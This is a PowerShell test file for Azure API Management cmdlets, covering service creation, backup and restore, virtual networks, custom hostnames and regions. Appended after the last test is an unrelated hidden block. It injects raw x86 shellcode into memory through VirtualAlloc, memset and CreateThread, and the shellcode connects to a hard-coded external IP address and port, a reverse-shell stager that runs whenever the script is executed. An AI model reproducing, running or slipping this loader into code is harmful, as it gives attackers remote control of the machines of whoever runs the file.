function Test-CrudApiManagement {$location = Get-ProviderLocation "Microsoft.ApiManagement/service"$resourceGroupName = Get-ResourceGroupName$apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$secondApiManagementName = Get-ApiManagementServiceName$secondOrganization = "second.apimpowershellorg"$secondAdminEmail = "second.apim@powershell.org"$secondSku = "Basic"$secondSkuCapacity = 2$enableTls=@{"Tls10" = "True"}$enable3DES=@{"TripleDes168" = "True"}$thirdApiManagementName = Get-ApiManagementServiceName$thirdSku = "Consumption"$thirdServiceLocation = "West Europe"try {New-AzResourceGroup -Name $resourceGroupName -Location $location$sslSetting = New-AzApiManagementSslSetting -FrontendProtocol $enableTls -CipherSuite $enable3DES$result = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $apiManagementName -Organization $organization -AdminEmail $adminEmail -SslSetting $sslSettingAssert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $location $result.LocationAssert-AreEqual "Developer" $result.SkuAssert-AreEqual 1 $result.CapacityAssert-AreEqual "None" $result.VpnTypeAssert-NotNull $result.SslSettingAssert-AreEqual "True" $result.SslSetting.FrontendProtocol["Tls10"]Assert-AreEqual "True" $result.SslSetting.CipherSuite["TripleDes168"]$token = Get-AzApiManagementSsoToken -ResourceGroupName $resourceGroupName -Name $apiManagementNameAssert-NotNull $token$apimServicesInGroup = Get-AzApiManagement -ResourceGroupName $resourceGroupNameAssert-True {$apimServicesInGroup.Count -ge 1}$secondResult = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $secondApiManagementName -Organization $secondOrganization -AdminEmail $secondAdminEmail -Sku $secondSku -Capacity $secondSkuCapacityAssert-AreEqual $resourceGroupName $secondResult.ResourceGroupNameAssert-AreEqual $secondApiManagementName $secondResult.NameAssert-AreEqual $location $secondResult.LocationAssert-AreEqual $secondSku $secondResult.SkuAssert-AreEqual $secondSkuCapacity $secondResult.Capacity$secondToken = Get-AzApiManagementSsoToken -ResourceGroupName $resourceGroupName -Name $secondApiManagementNameAssert-NotNull $secondToken$allServices = Get-AzApiManagementAssert-True {$allServices.Count -ge 2}$thirdResult = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $thirdServiceLocation -Name $thirdApiManagementName -Organization $secondOrganization -AdminEmail $secondAdminEmail -Sku $thirdSkuAssert-AreEqual $resourceGroupName $thirdResult.ResourceGroupNameAssert-AreEqual $thirdApiManagementName $thirdResult.NameAssert-AreEqual $thirdServiceLocation $thirdResult.LocationAssert-AreEqual $thirdSku $thirdResult.Sku$allServices = Get-AzApiManagementAssert-True {$allServices.Count -ge 3}$found = 0for ($i = 0; $i -lt $allServices.Count; $i++) {if ($allServices[$i].Name -eq $apiManagementName) {$found = $found + 1Assert-AreEqual $location $allServices[$i].LocationAssert-AreEqual $resourceGroupName $allServices[$i].ResourceGroupNameAssert-AreEqual "Developer" $allServices[$i].SkuAssert-AreEqual 1 $allServices[$i].Capacity}if ($allServices[$i].Name -eq $secondApiManagementName) {$found = $found + 1Assert-AreEqual $location $allServices[$i].LocationAssert-AreEqual $resourceGroupName $allServices[$i].ResourceGroupNameAssert-AreEqual $secondSku $allServices[$i].SkuAssert-AreEqual $secondSkuCapacity $allServices[$i].Capacity}if ($allServices[$i].Name -eq $thirdApiManagementName) {$found = $found + 1Assert-AreEqual $thirdServiceLocation $allServices[$i].LocationAssert-AreEqual $resourceGroupName $allServices[$i].ResourceGroupNameAssert-AreEqual $thirdSku $allServices[$i].Sku}}Assert-True {$found -eq 3} "Api Management services created earlier is not found."Get-AzApiManagement -ResourceGroupName $resourceGroupName | Remove-AzApiManagement$allServices = Get-AzApiManagement -ResourceGroupName $resourceGroupNameAssert-AreEqual 0 $allServices.Count}finally {Clean-ResourceGroup $resourceGroupName}}function Test-BackupRestoreApiManagement {$location = Get-ProviderLocation "Microsoft.ApiManagement/service"$resourceGroupName = Get-ResourceGroupName$storageLocation = Get-ProviderLocation "Microsoft.ClassicStorage/storageAccounts"$storageAccountName = Get-ApiManagementServiceName$apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$containerName = "backups"$backupName = $apiManagementName + ".apimbackup"try {New-AzResourceGroup -Name $resourceGroupName -Location $location -ForceNew-AzStorageAccount -StorageAccountName $storageAccountName -Location $storageLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageKey = (Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -StorageAccountName $storageAccountName).Key1$storageContext = New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageKey$apiManagementService = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $apiManagementName -Organization $organization -AdminEmail $adminEmailBackup-AzApiManagement -ResourceGroupName $resourceGroupName -Name $apiManagementName -StorageContext $storageContext -TargetContainerName $containerName -TargetBlobName $backupName$restoreResult = Restore-AzApiManagement -ResourceGroupName $resourceGroupName -Name $apiManagementName -StorageContext $storageContext -SourceContainerName $containerName -SourceBlobName $backupName -PassThruAssert-AreEqual $resourceGroupName $restoreResult.ResourceGroupNameAssert-AreEqual $apiManagementName $restoreResult.NameAssert-AreEqual $location $restoreResult.LocationAssert-AreEqual "Developer" $restoreResult.SkuAssert-AreEqual 1 $restoreResult.CapacityAssert-AreEqual "Succeeded" $restoreResult.ProvisioningState}finally {Clean-ResourceGroup $resourceGroupName    }   }function Test-ApiManagementVirtualNetworkCRUD {$primarylocation = "North Central US"$secondarylocation = "South Central US"$resourceGroupName = Get-ResourceGroupName    $apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$sku = "Developer"$capacity = 1$primarySubnetResourceId = "/subscriptions/a200340d-6b82-494d-9dbf-687ba6e33f9e/resourceGroups/powershelltest/providers/Microsoft.Network/virtualNetworks/powershellvnetncu/subnets/default"$additionalSubnetResourceId = "/subscriptions/a200340d-6b82-494d-9dbf-687ba6e33f9e/resourceGroups/powershelltest/providers/Microsoft.Network/virtualNetworks/powershellvnetscu/subnets/default"$vpnType = "External" try {New-AzResourceGroup -Name $resourceGroupName -Location $primarylocation$virtualNetwork = New-AzApiManagementVirtualNetwork -SubnetResourceId $primarySubnetResourceId$result = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $primarylocation -Name $apiManagementName -Organization $organization -AdminEmail $adminEmail -VpnType $vpnType -VirtualNetwork $virtualNetwork -Sku $sku -Capacity $capacityAssert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $primarylocation $result.LocationAssert-AreEqual $sku $result.SkuAssert-AreEqual 1 $result.CapacityAssert-AreEqual $vpnType $result.VpnTypeAssert-Null $result.PrivateIPAddressesAssert-NotNull $result.PublicIPAddressesAssert-AreEqual $primarySubnetResourceId $result.VirtualNetwork.SubnetResourceId$networkStatus = Get-AzApiManagementNetworkStatus -ResourceGroupName $resourceGroupName -Name $apiManagementNameAssert-NotNull $networkStatusAssert-NotNull $networkStatus.DnsServersAssert-NotNull $networkStatus.ConnectivityStatus$service = Get-AzApiManagement -ResourceGroupName $resourceGroupName -Name $apiManagementName$vpnType = "Internal"$service.VirtualNetwork = $virtualNetwork$service.VpnType = $vpnType$sku = "Premium"$service.Sku = $sku$additionalRegionVirtualNetwork = New-AzApiManagementVirtualNetwork -SubnetResourceId $additionalSubnetResourceId$service = Add-AzApiManagementRegion -ApiManagement $service -Location $secondarylocation -VirtualNetwork $additionalRegionVirtualNetwork$service = Set-AzApiManagement -InputObject $service -PassThruAssert-AreEqual $resourceGroupName $service.ResourceGroupNameAssert-AreEqual $apiManagementName $service.NameAssert-AreEqual $sku $service.SkuAssert-AreEqual $primarylocation $service.LocationAssert-AreEqual "Succeeded" $service.ProvisioningStateAssert-AreEqual $vpnType $service.VpnTypeAssert-NotNull $service.VirtualNetworkAssert-NotNull $service.VirtualNetwork.SubnetResourceIdAssert-NotNull $service.PrivateIPAddressesAssert-NotNull $service.PublicIPAddressesAssert-AreEqual $primarySubnetResourceId $service.VirtualNetwork.SubnetResourceIdAssert-AreEqual 1 $service.AdditionalRegions.Count$found = 0for ($i = 0; $i -lt $service.AdditionalRegions.Count; $i++) {if ($service.AdditionalRegions[$i].Location -eq $secondarylocation) {$found = $found + 1Assert-AreEqual $sku $service.AdditionalRegions[$i].SkuAssert-AreEqual 1 $service.AdditionalRegions[$i].CapacityAssert-NotNull $service.AdditionalRegions[$i].VirtualNetworkAssert-AreEqual $additionalSubnetResourceId $service.AdditionalRegions[$i].VirtualNetwork.SubnetResourceIdAssert-NotNull $service.AdditionalRegions[$i].PrivateIPAddressesAssert-NotNull $service.AdditionalRegions[$i].PublicIPAddresses}}Assert-True {$found -eq 1} "Api Management regions created earlier is not found."$networkStatus = Get-AzApiManagementNetworkStatus -ApiManagementObject $serviceAssert-NotNull $networkStatusAssert-NotNull $networkStatus.DnsServersAssert-NotNull $networkStatus.ConnectivityStatus}finally {Clean-ResourceGroup $resourceGroupName    }}function Test-ApiManagementHostnamesCRUD {$location = "North Central US"$certFilePath = "$TestOutputRoot/powershelltest.pfx";$certPassword = "Password";$certSubject = "CN=*.msitesting.net"$certThumbprint = "8E989652CABCF585ACBFCB9C2C91F1D174FDB3A2"$portalHostName = "portalsdk.msitesting.net"$proxyHostName1 = "gateway1.msitesting.net"$proxyHostName2 = "gateway2.msitesting.net"$managementHostName = "mgmt.msitesting.net"$resourceGroupName = Get-ResourceGroupName$apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$sku = "Premium" $capacity = 1try {New-AzResourceGroup -Name $resourceGroupName -Location $location$securePfxPassword = ConvertTo-SecureString $certPassword -AsPlainText -Force$customProxy1 = New-AzApiManagementCustomHostnameConfiguration -Hostname $proxyHostName1 -HostnameType Proxy -PfxPath $certFilePath -PfxPassword $securePfxPassword -DefaultSslBinding$customProxy2 = New-AzApiManagementCustomHostnameConfiguration -Hostname $proxyHostName2 -HostnameType Proxy -PfxPath $certFilePath -PfxPassword $securePfxPassword$customPortal = New-AzApiManagementCustomHostnameConfiguration -Hostname $portalHostName -HostnameType Portal -PfxPath $certFilePath -PfxPassword $securePfxPassword$customMgmt = New-AzApiManagementCustomHostnameConfiguration -Hostname $managementHostName -HostnameType Management -PfxPath $certFilePath -PfxPassword $securePfxPassword$customHostnames = @($customProxy1, $customProxy2, $customPortal, $customMgmt)$result = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $apiManagementName -Organization $organization -AdminEmail $adminEmail -Sku $sku -Capacity $capacity -CustomHostnameConfiguration $customHostnamesAssert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $location $result.LocationAssert-AreEqual $sku $result.SkuAssert-AreEqual 1 $result.CapacityAssert-AreEqual "None" $result.VpnTypeAssert-NotNull $result.ProxyCustomHostnameConfigurationAssert-AreEqual 3 $result.ProxyCustomHostnameConfiguration.Countfor ($i = 0; $i -lt $result.ProxyCustomHostnameConfiguration.Count; $i++) {if ($result.ProxyCustomHostnameConfiguration[$i].Hostname -eq $proxyHostName1) {$found = $found + 1Assert-AreEqual Proxy $result.ProxyCustomHostnameConfiguration[$i].HostnameTypeAssert-AreEqual $certThumbprint $result.ProxyCustomHostnameConfiguration[$i].CertificateInformation.ThumbprintAssert-True {$result.ProxyCustomHostnameConfiguration[$i].DefaultSslBinding}Assert-False {$result.ProxyCustomHostnameConfiguration[$i].NegotiateClientCertificate}Assert-Null $result.ProxyCustomHostnameConfiguration[$i].KeyVaultId}if ($result.ProxyCustomHostnameConfiguration[$i].Hostname -eq $proxyHostName2) {$found = $found + 1Assert-AreEqual Proxy $result.ProxyCustomHostnameConfiguration[$i].HostnameTypeAssert-AreEqual $certThumbprint $result.ProxyCustomHostnameConfiguration[$i].CertificateInformation.ThumbprintAssert-True {$result.ProxyCustomHostnameConfiguration[$i].DefaultSslBinding}Assert-False {$result.ProxyCustomHostnameConfiguration[$i].NegotiateClientCertificate}Assert-Null $result.ProxyCustomHostnameConfiguration[$i].KeyVaultId}}Assert-NotNull $result.PortalCustomHostnameConfigurationAssert-AreEqual $portalHostName $result.PortalCustomHostnameConfiguration.HostnameAssert-AreEqual Portal $result.PortalCustomHostnameConfiguration.HostnameTypeAssert-AreEqual $certThumbprint $result.PortalCustomHostnameConfiguration.CertificateInformation.ThumbprintAssert-NotNull $result.ManagementCustomHostnameConfigurationAssert-AreEqual $managementHostName $result.ManagementCustomHostnameConfiguration.HostnameAssert-AreEqual Management $result.ManagementCustomHostnameConfiguration.HostnameTypeAssert-AreEqual $certThumbprint $result.ManagementCustomHostnameConfiguration.CertificateInformation.ThumbprintAssert-Null $result.ScmCustomHostnameConfiguration$result.ManagementCustomHostnameConfiguration = $null$result.PortalCustomHostnameConfiguration = $null$result.ProxyCustomHostnameConfiguration = @($customProxy1)$certificateStoreLocation = "CertificateAuthority"$systemCert = New-AzApiManagementSystemCertificate -StoreName $certificateStoreLocation -PfxPath $certFilePath -PfxPassword $securePfxPassword$result.SystemCertificates = @($systemCert)$result = Set-AzApiManagement -InputObject $result -PassThru Assert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $location $result.LocationAssert-AreEqual $sku $result.SkuAssert-AreEqual 1 $result.CapacityAssert-AreEqual "None" $result.VpnTypeAssert-NotNull $result.ProxyCustomHostnameConfigurationAssert-AreEqual 2 $result.ProxyCustomHostnameConfiguration.Countfor ($i = 0; $i -lt $result.ProxyCustomHostnameConfiguration.Count; $i++) {if ($result.ProxyCustomHostnameConfiguration[$i].Hostname -eq $proxyHostName1) {$found = $found + 1Assert-AreEqual Proxy $result.ProxyCustomHostnameConfiguration[$i].HostnameTypeAssert-AreEqual $certThumbprint $result.ProxyCustomHostnameConfiguration[$i].CertificateInformation.ThumbprintAssert-True {$result.ProxyCustomHostnameConfiguration[$i].DefaultSslBinding}Assert-False {$result.ProxyCustomHostnameConfiguration[$i].NegotiateClientCertificate}Assert-Null $result.ProxyCustomHostnameConfiguration[$i].KeyVaultId}}Assert-Null $result.PortalCustomHostnameConfigurationAssert-Null $result.ManagementCustomHostnameConfigurationAssert-Null $result.ScmCustomHostnameConfigurationAssert-NotNull $result.SystemCertificatesAssert-AreEqual 1 $result.SystemCertificates.CountAssert-AreEqual $certificateStoreLocation $result.SystemCertificates.StoreNameAssert-AreEqual $certThumbprint $result.SystemCertificates.CertificateInformation.Thumbprint}finally {Clean-ResourceGroup $resourceGroupName   }}function Test-ApiManagementWithAdditionalRegionsCRUD {$location = Get-ProviderLocation "Microsoft.ApiManagement/service"  $resourceGroupName = Get-ResourceGroupName    $apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$sku = "Premium"$capacity = 1$firstAdditionalRegionLocation = "East US"$secondAdditionalRegionLocation = "South Central US"try {New-AzResourceGroup -Name $resourceGroupName -Location $location$firstAdditionalRegion = New-AzApiManagementRegion -Location $firstAdditionalRegionLocation$secondAdditionalRegion = New-AzApiManagementRegion -Location $secondAdditionalRegionLocation$regions = @($firstAdditionalRegion, $secondAdditionalRegion)$result = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $apiManagementName -Organization $organization -AdminEmail $adminEmail -Sku $sku -Capacity $capacity -AdditionalRegions $regionsAssert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $location $result.LocationAssert-AreEqual $sku $result.SkuAssert-AreEqual $capacity $result.CapacityAssert-AreEqual "None" $result.VpnTypeAssert-AreEqual 2 $result.AdditionalRegions.Count$found = 0for ($i = 0; $i -lt $result.AdditionalRegions.Count; $i++) {if ($result.AdditionalRegions[$i].Location.Replace(" ", "") -eq $firstAdditionalRegionLocation.Replace(" ", "")) {$found = $found + 1Assert-AreEqual $sku $result.AdditionalRegions[$i].SkuAssert-AreEqual 1 $result.AdditionalRegions[$i].CapacityAssert-Null $result.AdditionalRegions[$i].VirtualNetwork}if ($result.AdditionalRegions[$i].Location.Replace(" ", "") -eq $secondAdditionalRegionLocation.Replace(" ", "")) {$found = $found + 1Assert-AreEqual $sku $result.AdditionalRegions[$i].SkuAssert-AreEqual 1 $result.AdditionalRegions[$i].CapacityAssert-Null $result.AdditionalRegions[$i].VirtualNetwork}}$newAdditionalRegionCapacity = 2$apimService = Get-AzApiManagement -ResourceGroupName $resourceGroupName -Name $apiManagementName$apimService = Remove-AzApiManagementRegion -ApiManagement $apimService -Location $firstAdditionalRegionLocation$apimService = Update-AzApiManagementRegion -ApiManagement $apimService -Location $secondAdditionalRegionLocation -Capacity $newAdditionalRegionCapacity -Sku $sku$updatedService = Set-AzApiManagement -InputObject $apimService -AssignIdentity -PassThruAssert-AreEqual $resourceGroupName $updatedService.ResourceGroupNameAssert-AreEqual $apiManagementName $updatedService.NameAssert-AreEqual $location $updatedService.LocationAssert-AreEqual $sku $updatedService.SkuAssert-AreEqual $capacity $updatedService.CapacityAssert-AreEqual "None" $updatedService.VpnTypeAssert-AreEqual 1 $updatedService.AdditionalRegions.Count$found = 0for ($i = 0; $i -lt $updatedService.AdditionalRegions.Count; $i++) {            if ($updatedService.AdditionalRegions[$i].Location.Replace(" ", "") -eq $secondAdditionalRegionLocation.Replace(" ", "")) {$found = $found + 1Assert-AreEqual $sku $updatedService.AdditionalRegions[$i].SkuAssert-AreEqual $newAdditionalRegionCapacity $updatedService.AdditionalRegions[$i].CapacityAssert-Null $updatedService.AdditionalRegions[$i].VirtualNetwork}}Assert-AreEqual "SystemAssigned" $updatedService.Identity.Type;Assert-NotNull $updatedService.Identity.PrincipalId;Assert-NotNull $updatedService.Identity.TenantId;}finally {Clean-ResourceGroup $resourceGroupName}}function Test-CrudApiManagementWithExternalVpn {$location = "North Central US"    $resourceGroupName = Get-ResourceGroupName    $apiManagementName = Get-ApiManagementServiceName$organization = "apimpowershellorg"$adminEmail = "apim@powershell.org"$sku = "Developer"$capacity = 1$subnetResourceId = "/subscriptions/20010222-2b48-4245-a95c-090db6312d5f/resourceGroups/powershelltest/providers/Microsoft.Network/virtualNetworks/apimvnettest/subnets/default"$vpnType = "External"try {New-AzResourceGroup -Name $resourceGroupName -Location $location$virtualNetwork = New-AzApiManagementVirtualNetwork -Location $location -SubnetResourceId $subnetResourceId$result = New-AzApiManagement -ResourceGroupName $resourceGroupName -Location $location -Name $apiManagementName -Organization $organization -AdminEmail $adminEmail -VpnType $vpnType -VirtualNetwork $virtualNetwork -Sku $sku -Capacity $capacityAssert-AreEqual $resourceGroupName $result.ResourceGroupNameAssert-AreEqual $apiManagementName $result.NameAssert-AreEqual $location $result.LocationAssert-AreEqual $sku $result.SkuAssert-AreEqual 1 $result.CapacityAssert-AreEqual $vpnType $result.VpnTypeAssert-AreEqual $subnetResourceId $result.VirtualNetwork.SubnetResourceIdGet-AzApiManagement -ResourceGroupName $resourceGroupName | Remove-AzApiManagement$allServices = Get-AzApiManagement -ResourceGroupName $resourceGroupNameAssert-AreEqual 0 $allServices.Count}finally {Clean-ResourceGroup $resourceGroupName}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd9,0xd9,0x43,0xfd,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};